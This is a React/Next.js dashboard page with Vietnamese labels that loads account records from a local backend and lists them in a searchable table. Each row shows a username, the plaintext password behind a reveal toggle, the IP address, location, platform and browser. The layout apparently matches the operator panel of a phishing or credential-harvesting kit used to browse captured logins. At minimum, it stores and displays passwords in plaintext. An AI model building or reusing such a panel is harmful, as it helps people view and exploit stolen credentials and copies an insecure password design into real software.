"use client";

import React, { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { LogOut, Eye, EyeOff, Copy, Check, Search, Users } from "lucide-react";
import { useAuthStore } from "@/store/authStore";

type Admin = {
  _id: string;
  username: string;
  password: string;
  ipAddress: string;
  userAgent: string;
  location: string;
  platform: string;
  createdAt: string;
};

type AdminData = {
  results: Admin[];
  pagination: {
    total_page: number;
    page_size: number;
    current_page: number;
    total: number;
  };
};

const formatDate = (iso: string) =>
  new Date(iso).toLocaleString("en-US", {
    dateStyle: "short",
    timeStyle: "short",
  });

const getBrowserInfo = (ua: string) =>
  ua.includes("Chrome")
    ? "Chrome"
    : ua.includes("Firefox")
    ? "Firefox"
    : ua.includes("Safari")
    ? "Safari"
    : "Unknown";

const Pages = () => {
  const { logout } = useAuthStore();

  const [adminData, setAdminData] = useState<AdminData>({
    results: [],
    pagination: {
      total_page: 1,
      page_size: 10,
      current_page: 1,
      total: 0,
    },
  });

  const [searchTerm, setSearchTerm] = useState("");
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>(
    {}
  );
  const [copiedField, setCopiedField] = useState("");

  const togglePassword = (id: string) => {
    setShowPasswords((prev) => ({
      ...prev,
      [id]: !prev[id],
    }));
  };

  const copyToClipboard = async (id: string, value: string) => {
    await navigator.clipboard.writeText(value);
    setCopiedField(id);
    setTimeout(() => setCopiedField(""), 1000);
  };

  useEffect(() => {
    const fetchAccount = async () => {
      try {
        const response = await fetch("http://localhost:8081/account", {
          method: "GET",
        });
        const data = await response.json();
        setAdminData(data);
      } catch (error) {
        console.error("Không thể tải tài khoản:", error);
      }
    };

    fetchAccount();
  }, []);

  const filteredData = adminData.results.filter((admin) => {
    const term = searchTerm.toLowerCase();
    return (
      admin.username.toLowerCase().includes(term) ||
      admin.ipAddress.toLowerCase().includes(term) ||
      admin.location.toLowerCase().includes(term)
    );
  });

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="mb-6 flex justify-between items-center">
        <Button
          onClick={logout}
          variant="outline"
          className="flex items-center gap-2 hover:bg-red-50 hover:border-red-200 hover:text-red-600"
        >
          <LogOut className="h-4 w-4" />
          Logout
        </Button>

        <div className="flex items-center gap-4">
          <Badge variant="secondary" className="flex items-center gap-2">
            <Users className="h-4 w-4" />
            {adminData.pagination.total} Tổng số người dùng
          </Badge>
        </div>
      </div>

      <div className="max-w-7xl mx-auto space-y-6">
        <Card>
          <CardHeader>
            <CardTitle className="text-black">Tìm kiếm & Lọc</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex items-center gap-4">
              <div className="relative flex-1">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
                <Input
                  placeholder="Search by username, IP address, or location..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10 text-black"
                />
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent>
            <div className="overflow-x-auto">
              <Table className="text-black">
                <TableHeader className="text-black">
                  <TableRow className="text-black">
                    <TableHead className="text-black">Username</TableHead>
                    <TableHead className="text-black">Password</TableHead>
                    <TableHead className="text-black">IP Address</TableHead>
                    <TableHead className="text-black">Location</TableHead>
                    <TableHead className="text-black">Platform</TableHead>
                    <TableHead className="text-black">Browser</TableHead>
                    <TableHead className="text-black">Created</TableHead>
                    <TableHead className="text-black">Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredData.map((admin) => (
                    <TableRow key={admin._id}>
                      <TableCell>
                        <div className="font-semibold text-blue-600">
                          {admin.username}
                        </div>
                        <div className="text-xs font-mono">
                          {admin._id.slice(0, 8)}...
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <span className="font-mono text-sm">
                            {showPasswords[admin._id]
                              ? admin.password
                              : "••••••••"}
                          </span>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => togglePassword(admin._id)}
                            className="h-6 w-6 p-0"
                          >
                            {showPasswords[admin._id] ? (
                              <EyeOff className="h-3 w-3" />
                            ) : (
                              <Eye className="h-3 w-3" />
                            )}
                          </Button>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge
                          variant="outline"
                          className="font-mono text-gray-700 text-xs"
                        >
                          {admin.ipAddress}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <div className="text-sm">
                          {admin.location.includes("undefined") ? (
                            <Badge variant="secondary">Unknown</Badge>
                          ) : (
                            admin.location
                          )}
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge variant="secondary">{admin.platform}</Badge>
                      </TableCell>
                      <TableCell>
                        <div className="text-sm">
                          {getBrowserInfo(admin.userAgent)}
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="text-sm text-gray-600">
                          {formatDate(admin.createdAt)}
                        </div>
                      </TableCell>
                      <TableCell>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => copyToClipboard(admin._id, admin._id)}
                          className="h-6 w-6 p-0"
                          title="Copy ID"
                        >
                          {copiedField === admin._id ? (
                            <Check className="h-3 w-3 text-green-600" />
                          ) : (
                            <Copy className="h-3 w-3" />
                          )}
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="pt-6">
            <div className="flex items-center justify-between text-sm text-gray-600">
              <div>
                Page {adminData.pagination.current_page} of
                {adminData.pagination.total_page}
              </div>
              <div>
                {adminData.pagination.total} total records (
                {adminData.pagination.page_size} per page)
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Pages;
